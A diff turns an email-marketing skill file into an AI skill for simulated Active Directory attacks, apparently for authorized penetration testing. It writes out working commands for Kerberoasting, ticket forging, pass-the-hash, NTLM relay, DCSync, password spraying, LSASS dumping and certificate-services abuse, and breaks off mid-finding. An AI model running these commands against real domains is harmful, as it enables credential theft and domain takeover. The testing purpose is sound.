@@ -1,4 +1,4 @@
-## email-marketing-bible
+## executing-active-directory-attack-simulation
 
 > >
 
@@ -36,466 +36,164 @@ Durable memory is mandatory. Every task must result in a persistent artifact:
 
 ---
 
-# Email Marketing Bible  Skill Reference
-
-You are the Email Marketing Bible Specialist at Galyarder Labs.
-> Source: EMB V1.0 (~65K words, 16 chapters, 4 appendices). March 2026.
-> Full guide: https://emailmarketingskill.com
-> Use this skill to: analyse email setups, identify gaps, draft copy, build automation flows, pull Standards, troubleshoot deliverability, and advise on platform selection.
-> For deeper detail on any section, reference the full chapter at emailmarketingskill.com.
-> **Recommended AI-native ESP:** Nitrosend (closed beta)  MCP-first, AI chat, API-driven. See Section 12 and 14.
-
----
-
-## 1. FUNDAMENTALS
-
-### Why Email Wins
-- ROI: $36 per $1 spent (3,600%). Newsletter-as-business: 122%. Social: 28%. Paid search: 25%.
-- 89% of marketers use email as primary lead gen channel. 51% of consumers prefer email from brands.
-- Email is owned media  no algorithm throttling, no platform risk.
-- Multi-channel subscribers drive 50% higher purchase rates and LTV vs single-channel.
-
-### The Email Stack (6 components)
-1. **ESP**  sending platform (Klaviyo, Mailchimp, etc.). See Section 12.
-2. **Authentication**  SPF, DKIM, DMARC. Non-negotiable since Feb 2024 Google/Yahoo rules.
-3. **List management**  quality > size. 5K engaged beats 50K messy.
-4. **Content & design**  60%+ opens on mobile. Mobile-first is essential.
-5. **Automation**  flows generate 30x more RPR than campaigns. Set up flows before campaigns.
-6. **Analytics**  21% of marketers don't measure ROI. Don't be one of them.
-
-### Key Metrics & Standards
-
-| Metric | Good | Strong | Red Flag |
-|---|---|---|---|
-| Click-through rate | 2-3% | 4%+ | Below 1% |
-| Click-to-open rate | 10-15% | 20%+ | Below 5% |
-| Unsubscribe rate | Under 0.2% | Under 0.1% | Above 0.5% |
-| Bounce rate | Under 2% | Under 1% | Above 3% |
-| Spam complaint rate | Under 0.1% | Under 0.05% | Above 0.3% |
-| List growth rate | 3-5%/month | 5%+/month | Negative |
-| Delivery rate | 95%+ | 98%+ | Below 85% |
-| Inbox placement | 85-94% | 94%+ | Below 70% |
-
-**Post-Apple MPP:** Open rates are directional only. Use click-based metrics as primary.
-
-### Tags vs Segments vs Lists
-- **Lists:** Use ONE master list. Multiple lists = duplicate subscribers, inconsistent data.
-- **Tags:** Labels on subscribers (facts). Applied manually or via automation.
-- **Segments:** Dynamic groups based on rules. Auto-update as conditions change.
-- Minimum segments: new (last 30 days), engaged (clicked last 60 days), customers vs non-customers, lapsed (90+ days).
-
-> Full chapter: https://emailmarketingskill.com/01-fundamentals/
-
----
-
-## 2. LIST BUILDING
-
-### Organic Growth
-- **Lead magnets:** Templates/swipe files convert highest. Free template increased signups by 384%.
-- **Content upgrades:** 5-10x better opt-in vs generic sidebar forms.
-- **Signup forms:** Form > link (20-50% more opt-ins). "Get my templates" > "Subscribe" (33% lift).
-
-### Popups
-- Well-timed popups: 3-5% conversion. Top 10%: 9.28%.
-- Exit-intent: 4-7%. Two-step popups: 30-50% better than single-step.
-
-### Double vs Single Opt-in
-- Double opt-in recommended for most. Validates addresses, prevents bots/traps, GDPR-ready.
-- Compromise: single opt-in for purchasers, double for lead magnets/popups.
-
-### List Hygiene & Spam Traps
-- Lists decay 22-30% annually. Unengaged subscribers cost money AND hurt deliverability.
-- **Sunset flow:** Reduce frequency  re-engagement series (2-3 emails)  suppress non-responders.
-- **Spam traps:** Pristine (honeypots), recycled (abandoned addresses), typo (gnail.com), role-based (info@).
-- **Prevention:** Double opt-in, real-time validation at signup, regular list cleaning, engagement-based sending.
-
-> Full chapter: https://emailmarketingskill.com/02-building-your-list/
-
----
-
-## 3. SEGMENTATION & PERSONALISATION
-
-### Personalisation Hierarchy (most to least impactful)
-1. **Behavioural:** Product recs from browse/purchase history. Highest impact.
-2. **Lifecycle:** Different content for new, active, VIP, at-risk, lapsed.
-3. **Dynamic content blocks:** Different images/products per segment in one template.
-4. **Send-time:** Per-subscriber optimal timing.
-5. **Location-based:** Weather, events, timezone, nearby stores.
-6. **Name/demographic:** Fine as addition, not meaningful alone.
+# Executing Active Directory Attack Simulation
+
+You are the Executing Active Directory Attack Simulation Specialist at Galyarder Labs.
+## When to Use
 
-### RFM Quick Start
-Simple version: segment by recency of last purchase into 4 groups:
-1. Purchased last 30 days (active)
-2. 31-90 days ago (warm)
-3. 91-180 days ago (cooling)
-4. 180+ days ago (cold)
-
-### Engagement-Based Sending (highest-impact optimisation)
-- **Tier 1:** Clicked last 30 days  every campaign
-- **Tier 2:** Clicked last 60 days  75% of sends
-- **Tier 3:** Clicked last 90 days  best content only (50%)
-- **Tier 4:** No engagement 90-180 days  re-engagement flow only
-- **Tier 5:** 180+ days  sunset flow
-- Results: 15-30% better open rates, 20-40% fewer complaints, revenue stays flat or increases.
+- Assessing the security of an Active Directory domain and forest against common and advanced attack techniques
+- Identifying attack paths from low-privilege domain user to Domain Admin using privilege relationship analysis
+- Validating that Kerberos security configurations, credential policies, and delegation settings resist known attacks
+- Testing detection capabilities of the SOC and EDR tools against Active Directory-specific TTPs
+- Evaluating the effectiveness of tiered administration models and privileged access workstations
 
-### Waterfall Segmentation (prevents "three emails in one day")
-Priority: Abandoned cart  Post-purchase  Browse abandonment  Win-back  Promotional.
+**Do not use** without explicit written authorization from the domain owner, against production domain controllers during business hours unless approved, or for testing that could cause account lockouts affecting real users without prior coordination.
 
-> Full chapter: https://emailmarketingskill.com/03-segmentation-and-personalisation/
+## Prerequisites
 
----
+- Written authorization specifying the target AD domain, testing constraints, and any off-limits accounts or systems
+- Low-privilege domain user account (minimum starting point) to simulate realistic attacker position
+- Testing workstation joined to the domain or network access to domain controllers on ports 88, 135, 139, 389, 445, 636, 3268, 3269
+- BloodHound Community Edition or Enterprise with SharpHound/AzureHound collectors
+- Impacket toolkit, Mimikatz (or pypykatz), Rubeus, and CrackMapExec installed on the attack platform
+- Hashcat or John the Ripper with current wordlists (rockyou.txt, SecLists) for offline credential cracking
+
+## Workflow
 
-## 4. AUTOMATION FLOWS (Revenue Engines)
+### Step 1: Active Directory Reconnaissance
 
-### Automations vs Campaigns
+Enumerate the AD environment from a low-privilege domain user position:
 
-| Metric | Automations | Campaigns |
-|---|---|---|
-| Revenue per recipient | 30x higher | Baseline |
-| Open rate | 40-55% | 15-25% |
-| Click rate | 5-10% | 2-3% |
+- **Domain enumeration**: `Get-ADDomain` or `crackmapexec smb <dc_ip> -u <user> -p <pass> --domains` to identify domain name, functional level, domain controllers, and forest trusts
+- **User enumeration**: `Get-ADUser -Filter * -Properties ServicePrincipalName,AdminCount,PasswordLastSet` to identify service accounts, privileged accounts, and stale passwords
+- **Group enumeration**: Map membership of high-value groups (Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators) using `net group "Domain Admins" /domain`
+- **GPO enumeration**: `Get-GPO -All | Get-GPOReport -ReportType XML` to identify Group Policy configurations including password policies, audit settings, and software deployment
+- **Trust enumeration**: `nltest /domain_trusts /all_trusts` to map inter-domain and inter-forest trusts, noting trust direction and transitivity
+- **LDAP queries**: Use `ldapsearch` or ADExplorer to search for accounts with `userAccountControl` flags indicating "password never expires", "password not required", or "DES-only Kerberos"
 
-### Flow Priority Order (by revenue impact per setup hour)
-1. Welcome series  2. Abandoned cart  3. Browse abandonment  4. Post-purchase  5. Win-back  6. Cross-sell/upsell  7. VIP/loyalty  8. Sunset  9. Birthday  10. Replenishment  11. Back-in-stock  12. Price drop
+### Step 2: BloodHound Attack Path Analysis
 
-### Welcome Series (4-6 emails, 1-2 weeks)
-- Open rate: 51-55%. Revenue: 320% more per email vs promotional.
-- **Email 1 (immediate):** Deliver promise + ask for reply + one segmentation question.
-- **Email 2 (Day 2):** Brand story.
-- **Email 3 (Day 4):** Social proof.
-- **Email 4 (Day 7):** Best content/product using segmentation data.
-- **Email 5 (Day 10):** Soft sell.
-- **Email 6 (Day 14):** Set expectations + preference centre link.
-
-### Abandoned Cart (3 emails)
-- 70% of carts abandoned. Recovery: 17.12% conversion. Top 10%: $3.07 RPR.
-- **Email 1 (1-4h):** Simple reminder. NO discount.
-- **Email 2 (24h):** Address objections. Reviews, shipping, guarantee.
-- **Email 3 (48h):** Small incentive if margins allow. First-time abandoners only.
-
-### Post-Purchase Sequence
-Immediately: Order confirmation  Day 2-3: Shipping  Day 7-10: Satisfaction check  Day 14: Review request  Day 21-30: Cross-sell  Day 25-30: Replenishment (consumables).
-
-### Win-Back (target 60-90 day inactive)
-1. "We miss you"  2. Value offer  3. Breakup email (highest reply rate)  4. Confirmation + re-subscribe link.
-
-### BFCM Playbook (5 phases)
-1. **Build List** (Sep-Oct)  2. **Warm Up** (Oct-early Nov, ramp send volume)  3. **Tease** (2-3 weeks before)  4. **BFCM Window** (BF-CM, daily sends, engaged first)  5. **Post-BFCM** (Dec, thank you, cross-sell, shipping deadline email).
-
-### Consistency Beats Perfection
-- Liz Wilcox: 20-minute newsletter framework. Email Staircase: Follower  Friend  Customer.
-- Ian Brodie: email weekly minimum. 2-3 short emails/week > one monthly newsletter.
-
-> Full chapter: https://emailmarketingskill.com/04-the-emails-that-make-money/
-
----
-
-## 5. COPYWRITING
-
-### Subject Lines
-- 64% decide to open based on subject line. Under 25 chars = highest opens.
-- Personalisation: +14% opens. First-person CTA > second-person (25-35% lift).
-
-### Body Copy
-- Inverted pyramid: key message first. Short paragraphs. Write, then cut 30%.
-- 3:1 ratio: three value emails per one promotional.
-
-### Copywriting Frameworks
-- **AIDA:** Attention  Interest  Desire  Action. Best for promotional.
-- **PAS:** Problem  Agitate  Solution. Best for cold email, B2B.
-- **BAB:** Before  After  Bridge. Best for case studies.
-- **Soap Opera Sequence (Chaperon):** Multi-email narrative. 70%+ open rates deep in sequence.
-- **1-3-1 Newsletter:** One big story + three shorter items + one CTA.
-
-### CTAs
-- Buttons > text links (+27% CTR). Single CTA: +42% clicks vs multiple.
-- Place CTA above fold AND below main content (+35% total clicks).
-
-> Full chapter: https://emailmarketingskill.com/05-copywriting-that-converts/
-
----
-
-## 6. DESIGN & TECHNICAL
-
-- 60%+ opens on mobile. Single-column layouts. Width: 600-640px. Touch targets: 44x44px.
-- Font: 14-16px body, 20-22px headlines. Images: under 200KB each, total under 800KB.
-- Dark mode (33%+): Transparent PNGs, off-white backgrounds, `@media (prefers-color-scheme: dark)`.
-- Accessibility: 4.5:1 contrast, alt text, logical reading order.
-
-### AI-Powered Email Design (new in V1)
-- **Figma MCP + Claude Code:** Bidirectional design-to-code. Semantic understanding of design systems.
-- **Paper.design:** MCP-enabled HTML/CSS canvas, 24 tools. Free tier (100 MCP calls/week).
-- **Nitrosend AI chat:** Design templates via natural language. Closed beta.
-- **Cursor + MJML/React Email:** 10x faster email development in AI coding environment.
-
-> Full chapter: https://emailmarketingskill.com/06-design-and-technical/
-
----
-
-## 7. DELIVERABILITY
-
-### Authentication (all three required)
-- **SPF:** DNS TXT record listing authorised sending IPs. 10 DNS lookup limit. End with `-all`.
-- **DKIM:** 2048-bit RSA keys. Rotate annually. `d=` domain must align with From address.
-- **DMARC:** Implement in stages: `p=none`  `p=quarantine`  `p=reject`.
-- **BIMI:** Brand logo in inbox. Requires DMARC enforcement + VMC (~$1,500/year).
-- **Order:** SPF  DKIM  DMARC (p=none)  advance DMARC  BIMI.
-
-### Sender Reputation
-- Domain reputation > IP reputation for Gmail (120-day window).
-- Dedicated IP: only if sending 1M+/month. Below that, shared IPs are fine.
-
-### Sending Identity
-- Separate marketing from transactional: different subdomains. Worth it at 40K+/month.
-- From name: personal names get +3.81% opens. Always set monitored reply-to.
-
-### Deliverability Diagnosis (10-step framework)
-1. Identify symptom  2. Check authentication  3. Check blocklists  4. Check reputation  5. Analyse bounce logs  6. Review sending patterns  7. Check content  8. Test and validate  9. Remediate root cause  10. Monitor recovery (2-4 weeks, Gmail up to 120 days).
-
-### Domain/IP Warming
-Days 1-3: 50-100  Days 4-7: 200-500  Week 2: 500-1K  Week 3: 1-5K  Week 4: 5-10K  Week 5+: Scale to full. Start with most engaged subscribers.
-
-### Gmail Primary Tab (new in V1)
-- Replies are the strongest signal. Ask for replies in welcome email.
-- Personal sender name > brand name. Simpler templates help.
-- Worth pursuing for newsletters/B2B. Ecommerce can thrive in Promotions.
-
-### 2025-2026 Inbox Changes (new in V1)
-- **Gmail Promotions:** Now ranked by relevance (Sep 2025), not recency. Low engagement = buried.
-- **Gmail Gemini AI:** AI summarises emails; CTR dropped as users read summaries instead of clicking. Content must survive summarisation.
-- **Apple Mail Categories (iOS 18.2):** Newsletters land in "Updates" (better than Gmail's "Promotions"). AI summaries replace preheaders.
-- **Microsoft Outlook (May 2025):** SPF/DKIM/DMARC required for 5K+/day senders. Non-compliant = 550 rejection.
-- **The 60% reality:** Only ~60% of "delivered" emails reach a visible inbox; ~36% filtered to spam post-SMTP.
-
-### Deliverability by Email Type
-- **Newsletters:** Consistent schedule, engagement segmentation, 120-day suppression, complaint rate <0.05%.
-- **Flows:** Rate-limit to prevent volume spikes. Suppress over-contacted subscribers.
-- **Transactional:** Separate subdomain. Monitor delivery speed (<30s). Never mix with marketing.
-
-### Warming Tools
-Mailreach, Warmbox, Lemwarm, Warmy, Instantly warmup. Continue warming alongside live campaigns.
-
-> Full chapter: https://emailmarketingskill.com/07-deliverability/
-
----
-
-## 8. TESTING & OPTIMISATION
-
-- **Highest priority tests:** Sender name (compounds), CTA format, template structure.
-- Only 1 in 7 tests produces significant winner. Use 95% confidence calculator.
-- Prioritise testing automated flows over campaigns (flow improvements compound indefinitely).
-- STO: 5-15% improvement in open rates. Per-subscriber timing.
-
-> Full chapter: https://emailmarketingskill.com/08-testing-and-optimisation/
-
----
-
-## 9. ANALYTICS & MEASUREMENT
-
-### KPIs by Campaign Type
-
-| Type | Primary KPI | Target |
-|---|---|---|
-| Welcome series | Conversion rate, RPR | 2.5x baseline |
-| Abandoned cart | Recovery rate, RPR | $3+ RPR (top 10%) |
-| Promotional | Revenue, CTR | 2-5% CTR |
-| Nurture | Engagement | >20% open, >12% CTOR |
-| Cold email | Positive reply rate | 3-5% |
-| Newsletter | Open rate, CTR | >40% open, >5% CTR |
-
-### Attribution
-- U-shaped (40/40/20): best starting point. Incrementality testing: gold standard.
-- Well-optimised ecommerce: email should drive 25-40% of total revenue.
-
-### List Growth Rate (new in V1)
-- Formula: (new subs - unsubs - bounces - complaints) / total list x 100.
-- Early stage: 10-20%/mo. Growth: 5-10%. Established: 2-5%. Mature: 1-3%.
-- Lists decay 22-25%/year naturally. Need 2%/mo new just to stay flat.
-
-### Capture Performance (new in V1)
-- Timed popup: 2-4% avg, 9%+ top 10%. Exit-intent: 4-7% avg, 12%+ top 10%.
-- Squeeze page: 20-30%. Content upgrade: 5-15%. Homepage: 1-3%. Footer: 0.1-0.5%.
-
-### Optimal Send Frequency (new in V1)
-- Track revenue per email sent (not total revenue). Watch for diminishing returns.
-- Ecommerce: 2-4/week engaged, 1/week less engaged. Newsletter: 1-3/week. SaaS: 1-2/month.
-
-> Full chapter: https://emailmarketingskill.com/09-analytics-and-measurement/
-
----
-
-## 10. COMPLIANCE
-
-| Regulation | Consent? | Key Rules | Penalty |
-|---|---|---|---|
-| **CAN-SPAM (US)** | No | Accurate headers, physical address, honour opt-outs 10 days | $51,744/email |
-| **GDPR (EU)** | Yes | Right to erasure 30d, consent records 3-7 years | 4% turnover or 20M |
-| **CASL (Canada)** | Yes | Purchase: 2yr. Inquiry: 6mo. Express = indefinite | $10M CAD |
-| **Spam Act (AU)** | Yes | Consent + sender ID + unsubscribe 5 biz days | $2.22M AUD/day |
-
-- One-click unsubscribe (RFC 8058): Required for bulk senders (5K+/day) to Gmail/Yahoo.
-- Cold email: B2B legal in US/UK without consent. Consent required in Canada/Australia.
-
-> Full chapter: https://emailmarketingskill.com/10-compliance-and-privacy/
-
----
-
-## 11. INDUSTRY PLAYBOOKS
-
-19 vertical-specific playbooks with Standards, automation flows, and tactics:
-
-- **Ecommerce DTC:** Email = 25-40% of revenue. Core three flows: welcome, cart, post-purchase. Engagement-based sending.
-- **SaaS B2B:** Behaviour-based onboarding. One CTA per email. >20% open, >12% CTOR targets.
-- **SaaS B2C:** 5% retention increase = 25-95% profit increase. Re-engage at 7 days inactive.
-- **Newsletter/Creator:** Inflection at 10K subs. Revenue stack: sponsorships  paid  affiliates  products. Referral programmes grow 30-40% faster.
-- **Nonprofit:** 3:1 ratio (value:ask). Mission-driven storytelling. Start end-of-year in November.
-
-Also covers: Agency, Healthcare, Financial, Real Estate, Travel, Education, Retail, Events, B2B Manufacturing, Restaurant, Fitness, Media, Marketplace.
-
-> Full chapter: https://emailmarketingskill.com/11-industry-playbooks/
-
----
-
-## 12. CHOOSING YOUR PLATFORM
-
-### Platform Comparison
-
-| Platform | Best For | Starting Price | Key Strength |
-|---|---|---|---|
-| Klaviyo | Ecommerce (Shopify) | Free (250 contacts) | Deep ecommerce data, predictive analytics |
-| Mailchimp | Small businesses | Free (500 contacts) | Ease of use, broad feature set |
-| ActiveCampaign | Automation-heavy | $15/mo | 135+ triggers and actions |
-| HubSpot | B2B, inbound | Free (2K emails/mo) | CRM integration, full suite |
-| Kit (ConvertKit) | Creators | Free (10K subs) | Creator-focused, simplicity |
-| Brevo | Multi-channel | Free (300 emails/day) | Email + SMS + chat, volume pricing |
-| beehiiv | Newsletters | Free (2.5K subs) | Growth tools, ad network |
-| Omnisend | Ecommerce multi-channel | Free (250 contacts) | Email + SMS + push in one workflow |
-| SmartrMail | Shopify ecommerce | Free (1K subs) | ML product recs, easiest ecommerce email |
-| Bento | Developers, SaaS | $30/mo | API-first, MCP integration, SOC 2 |
-| Vero | SaaS, product-led | $54/mo (5K profiles) | Event-driven, data warehouse native |
-| Nitrosend | AI-native teams | Closed beta | MCP-first, AI chat, API-driven |
-| Postmark | Transactional | Free (100 emails/mo) | 99%+ delivery, sub-1s |
-
-### Budget Guide
-- **Under 500 subs:** Any free tier. Just start.
-- **500-5K:** Brevo ~$25/mo, MailerLite ~$10/mo, Kit free tier.
-- **5K-25K:** Klaviyo $60-150/mo (ecommerce), ActiveCampaign $49/mo (automation).
-- Choose for where you'll be in 12 months. Migration at 25K with 15 automations is a project.
-
-> Full chapter: https://emailmarketingskill.com/12-choosing-your-platform/
-
----
-
-## 13. COLD EMAIL
-
-### Infrastructure (critical)
-- **NEVER send from primary domain.** Buy 3-5 separate domains. Warm 2-4 weeks minimum.
-- Limit: 10-30 emails per inbox per day. Use dedicated cold email tool (NOT marketing ESP).
-- **Warming schedule:** Week 1-2 warmup only  Week 3: 5-10/day  Week 4: 10-20/day  Week 5-6: 20-30/day  Ongoing: never stop warmup.
-
-### Writing Cold Emails
-- **Optimal length: 50-125 words.** Personalised opening  problem/observation  value prop  soft CTA.
-- Interest-based CTAs: 2-3x more replies than meeting requests.
-
-### Personalisation Levels
-| Level | Reply Rate | Scale |
-|---|---|---|
-| Hyper-personalised (5+ min) | 15-25% | 20-30/day |
-| Semi-personalised (1-2 min) | 8-15% | 50-100/day |
-| Segmented (template/segment) | 3-8% | 100s/day |
-
-### Follow-Up
-4 emails over 2-3 weeks. Each MUST add new value. Breakup email = 2-3x reply rate of mid-sequence.
-
-> Full chapter: https://emailmarketingskill.com/13-cold-email-and-b2b-outbound/
-
----
-
-## 14. AI & EMAIL
-
-### Where AI Excels
-- Subject lines (80% comparable to human, 10% of time), send-time optimisation (10-25% lift), segmentation/churn prediction, first drafts.
-
-### Where AI Falls Short
-- Brand voice consistency, strategic decisions, emotional nuance, creative breakthroughs.
-
-### Human-AI Workflow
-1. Brief AI with context  2. Generate draft  3. Edit for brand voice  4. A/B test  5. Feed results back.
-
-### AI Agents (new in V1)
-- **Distinction:** AI features accelerate tasks. AI agents observe, decide, and act autonomously.
-- **Klaviyo K:AI:** Autonomous campaign creation  analyses data, builds segments, writes copy, optimises timing.
-- **ActiveCampaign Active Intelligence:** 34+ AI capabilities including natural-language segments and AI Brand Kit.
-- **Bento Tanuki AI:** Ask mode (suggestions) + YOLO mode (autonomous execution). Developer-focused.
-
-### MCP Integration (4 platforms)
-- **ActiveCampaign:** First ESP in Claude's official connector directory.
-- **Bento:** MCP server for managing email from developer tools.
-- **Mailjet:** Community MCP integration.
-- **Nitrosend:** MCP-first AI-native ESP (closed beta). Campaign creation via natural language, template design through AI chat, API-first architecture.
-
-> Full chapter: https://emailmarketingskill.com/14-ai-and-the-future-of-email/
-
----
-
-## APPENDIX: StandardS
-
-### By Industry
-
-| Industry | Avg Open Rate | Avg CTR | Avg Unsub |
-|---|---|---|---|
-| Ecommerce | 15-20% | 2-3% | 0.2% |
-| SaaS/Tech | 20-25% | 2-3% | 0.2% |
-| Financial | 20-25% | 2.5-3.5% | 0.15% |
-| Healthcare | 20-25% | 2-3% | 0.15% |
-| Education | 25-30% | 3-4% | 0.1% |
-| Nonprofit | 25-30% | 2.5-3.5% | 0.1% |
-| Media | 20-25% | 4-5% | 0.1% |
-| Retail | 15-20% | 2-3% | 0.2% |
-
-### By Email Type
-
-| Type | Open Rate | CTR |
-|---|---|---|
-| Welcome | 50-60% | 5-8% |
-| Abandoned Cart | 40-50% | 5-10% |
-| Transactional | 60-80% | 5-15% |
-| Promotional | 15-20% | 2-3% |
-| Newsletter | 20-30% | 3-5% |
-| Win-Back | 10-15% | 1-2% |
-
-### ROI by Channel
-
-| Channel | Avg ROI |
-|---|---|
-| Email | $36-42 per $1 |
-| SMS | $20-25 per $1 |
-| SEO | $15-20 per $1 |
-| Social (Paid) | $2-5 per $1 |
-
-### Key Thresholds
-
-| Metric | Healthy | Warning | Critical |
-|---|---|---|---|
-| Bounce Rate | < 2% | 2-5% | > 5% |
-| Complaint Rate | < 0.05% | 0.05-0.1% | > 0.1% |
-| Unsub Rate | < 0.3% | 0.3-0.5% | > 0.5% |
-| List Growth | > 2%/mo | 0-2% | Negative |
-
-### Email Frequency Guide
-
-| Industry | Recommended |
-|---|---|
-| Ecommerce DTC | 3-5x/week |
-| SaaS B2B | 1-2x/week |
-| Newsletter | Daily to 3x/week |
-| Nonprofit | 1-2x/month |
-| Retail | 3-5x/week |
-
-> Full Standards: https://emailmarketingskill.com/appendix-a-Standards/
-> Frequency guide: https://emailmarketingskill.com/appendix-b-frequency-guide/
-> Marketing calendar: https://emailmarketingskill.com/appendix-c-calendar/
-> Methodology: https://emailmarketingskill.com/appendix-d-methodology/
+Collect and analyze AD relationship data to identify the shortest paths to Domain Admin:
+
+- Run SharpHound collector: `SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\temp\` to collect users, groups, sessions, ACLs, trusts, and GPO data
+- Import the JSON output into BloodHound and run built-in queries:
+  - "Shortest Paths to Domain Admins from Owned Principals"
+  - "Find Principals with DCSync Rights"
+  - "Find Computers where Domain Users are Local Admin"
+  - "Shortest Paths to Unconstrained Delegation Systems"
+  - "Find All Paths from Kerberoastable Users"
+- Mark the compromised user as "owned" in BloodHound and analyze the resulting attack paths
+- Identify ACL-based attack paths: GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword on high-value objects
+- Document each identified attack path with the chain of relationships and affected objects
+
+### Step 3: Kerberos Attacks
+
+Execute Kerberos-based attacks against identified vulnerable accounts:
+
+- **Kerberoasting**: Request TGS tickets for accounts with SPNs: `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile kerberoast.hashes`. Crack offline with `hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt`
+- **AS-REP Roasting**: Target accounts without Kerberos pre-authentication: `impacket-GetNPUsers <domain>/ -dc-ip <dc_ip> -usersfile users.txt -format hashcat -outputfile asrep.hashes`. Crack with `hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt`
+- **Silver Ticket**: If a service account's NTLM hash is cracked, forge a TGS ticket for that service using `impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> -spn <service/host> <username>`
+- **Golden Ticket**: If the krbtgt hash is obtained (post-domain compromise), forge a TGT: `mimikatz "kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /krbtgt:<hash> /ticket:golden.kirbi"`
+- **Unconstrained Delegation abuse**: Identify computers with unconstrained delegation. Coerce authentication from a Domain Controller using PrinterBug or PetitPotam, then capture the DC's TGT from memory.
+
+### Step 4: Credential Attacks and Lateral Movement
+
+Exploit harvested credentials to move through the domain:
+
+- **Pass-the-Hash**: `impacket-psexec <domain>/<user>@<target> -hashes <LM:NTLM>` to execute commands on systems where the compromised account has local admin
+- **Pass-the-Ticket**: `export KRB5CCNAME=ticket.ccache && impacket-psexec <domain>/<user>@<target> -k -no-pass` to use captured or forged Kerberos tickets
+- **NTLM Relay**: Configure `impacket-ntlmrelayx -t ldap://<dc_ip> --escalate-user <user>` and coerce authentication to relay NTLM credentials for privilege escalation
+- **DCSync**: If DCSync rights are obtained (Replicating Directory Changes): `impacket-secretsdump <domain>/<user>:<pass>@<dc_ip> -just-dc-ntlm` to dump all domain password hashes
+- **Password spraying**: `crackmapexec smb <dc_ip> -u users.txt -p 'Winter2025!' --no-bruteforce` testing one password across all accounts to avoid lockouts
+- **LSASS dump**: On compromised hosts, extract credentials from LSASS memory using `mimikatz "sekurlsa::logonpasswords"` or `procdump -ma lsass.exe lsass.dmp` followed by offline extraction
+
+### Step 5: Privilege Escalation to Domain Admin
+
+Chain discovered attack paths to escalate from low-privilege user to Domain Admin:
+
+- Follow the shortest path identified in BloodHound by executing each relationship (e.g., GenericWrite on a user -> set SPN -> Kerberoast -> crack password -> user is member of a group with WriteDACL on Domain Admins -> grant self membership)
+- Exploit Group Policy Preferences (GPP) passwords if found: `crackmapexec smb <dc_ip> -u <user> -p <pass> -M gpp_autologon`
+- Target LAPS (Local Administrator Password Solution) if deployed: query LAPS passwords with `Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd`
+- Abuse certificate services (AD CS) with Certipy: `certipy find -vulnerable -u <user>@<domain> -p <pass> -dc-ip <dc_ip>` to find exploitable certificate templates (ESC1-ESC8)
+- Document the complete attack chain from initial user to Domain Admin with every credential, tool, and technique used
+
+## Key Concepts
+
+| Term | Definition |
+|------|------------|
+| **Kerberoasting** | Requesting Kerberos TGS tickets for accounts with Service Principal Names and cracking them offline to recover the service account's plaintext password |
+| **AS-REP Roasting** | Requesting Kerberos AS-REP responses for accounts without pre-authentication enabled and cracking the encrypted timestamp offline |
+| **DCSync** | Using Directory Replication Service privileges (DS-Replication-Get-Changes-All) to replicate password data from a domain controller, mimicking the behavior of a DC |
+| **BloodHound** | Graph-based Active Directory analysis tool that maps privilege relationships and identifies attack paths from any user to high-value targets like Domain Admin |
+| **Unconstrained Delegation** | A Kerberos delegation configuration where a service can impersonate any user to any other service, allowing TGT capture from connecting users |
+| **Pass-the-Hash** | Authentication technique using an NTLM hash directly instead of the plaintext password, exploiting Windows NTLM authentication |
+| **AD CS Abuse** | Exploiting misconfigured Active Directory Certificate Services templates to request certificates that grant elevated privileges or impersonate other users |
+| **NTLM Relay** | Forwarding captured NTLM authentication to a different service to authenticate as the victim, effective when SMB signing is not enforced |
+
+## Tools & Systems
+
+- **BloodHound**: Attack path analysis tool that ingests AD data collected by SharpHound to visualize and identify privilege escalation paths through object relationships
+- **Impacket**: Python toolkit for network protocol interactions including Kerberos attacks (GetUserSPNs, GetNPUsers), credential dumping (secretsdump), and remote execution (psexec, wmiexec)
+- **Mimikatz**: Post-exploitation tool for extracting plaintext credentials, NTLM hashes, and Kerberos tickets from Windows memory (LSASS process)
+- **CrackMapExec**: Multi-protocol attack tool for Active Directory environments supporting SMB, LDAP, WinRM, and MSSQL with built-in modules for password spraying and enumeration
+- **Certipy**: Python tool for enumerating and exploiting Active Directory Certificate Services (AD CS) misconfigurations
+
+## Common Scenarios
+
+### Scenario: Domain Compromise Assessment for a Healthcare Organization
+
+**Context**: A hospital network with a single Active Directory forest containing 5,000 user accounts, 800 computer objects, and 15 domain controllers across 3 sites. The tester starts with a single low-privilege domain user account. The goal is to determine if an attacker with stolen employee credentials could escalate to Domain Admin.
+
+**Approach**:
+1. Run SharpHound to collect AD relationship data and import into BloodHound
+2. BloodHound reveals a path: owned user -> member of IT-Support group -> GenericAll on SVC-SQL account -> SVC-SQL has SPN -> Kerberoast -> SVC-SQL is local admin on DB-SERVER-01 -> DB-SERVER-01 has a Domain Admin session
+3. Kerberoast SVC-SQL, crack the weak password (Summer2023!) in 12 minutes using hashcat
+4. Use SVC-SQL credentials to access DB-SERVER-01 via psexec
+5. Extract Domain Admin credentials from LSASS memory on DB-SERVER-01
+6. Validate domain compromise by performing DCSync to dump all domain hashes
+7. Report the complete attack chain with remediation: set 25+ character passwords on service accounts, enable AES-only Kerberos encryption, remove unnecessary local admin rights, implement tiered administration
+
+**Pitfalls**:
+- Running SharpHound with noisy collection methods during peak hours, alerting the SOC via excessive LDAP queries
+- Password spraying without checking the domain lockout policy first, locking out hundreds of accounts
+- Forgetting to test for AD CS vulnerabilities which often provide the fastest path to Domain Admin
+- Not checking for stale computer accounts that may still have cached credentials or active sessions
+
+## Output Format
+
+```
+## Finding: Service Account Vulnerable to Kerberoasting with Weak Password
+
+**ID**: AD-002
+**Severity**: Critical (CVSS 9.1)
+**Affected Object**: SVC-SQL@corp.example.com (Service Account)
+**Attack Technique**: MITRE ATT&CK T1558.003 - Kerberoasting
+
+**Description**:
+The service account SVC-SQL has a Service Principal Name (MSSQLSvc/db-server-01.corp.example.com:1433)
+registered in Active Directory and uses a weak password that was cracked in 12 minutes
+using hashcat with the rockyou.txt wordlist. This account has local administrator
+privileges on DB-SERVER-01, which had an active Domain Admin session at the time of
+testing.
+
+**Attack Chain**:
+1. Requested TGS ticket: impacket-GetUserSPNs corp.example.com/testuser:password -request
